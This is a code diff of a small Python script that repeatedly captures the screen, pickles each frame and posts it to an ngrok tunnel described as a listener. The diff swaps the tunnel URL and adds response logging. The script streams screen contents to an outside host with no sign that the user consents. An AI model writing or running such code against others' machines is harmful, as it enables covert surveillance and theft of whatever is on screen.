@@ -1,10 +1,9 @@
-import socket
 import mss
 import numpy as np
 import pickle
 import requests
 import time
-import cv2  # Make sure to import cv2
+import cv2  # Ensure you have this installed
 
 # Function to capture the screen
 def capture_screen():
@@ -17,13 +16,17 @@ def capture_screen():
             yield img_np
 
 def send_screen_to_listener():
-    server_url = 'https://1fa6-79-134-141-41.ngrok-free.app/screen'  # Your Ngrok URL
+    server_url = 'https://2a8b-79-134-141-41.ngrok-free.app/screen'  # Your Ngrok URL
     screen_gen = capture_screen()
 
     for screen in screen_gen:
         data = pickle.dumps(screen)
         try:
-            requests.post(server_url, data=data)
+            response = requests.post(server_url, data=data)
+            if response.status_code == 200:
+                print("Screen sent successfully.")
+            else:
+                print(f"Failed to send screen: {response.status_code}")
             time.sleep(0.1)  # Adjust delay as needed for performance
         except Exception as e:
             print(f"Error sending screen: {e}")
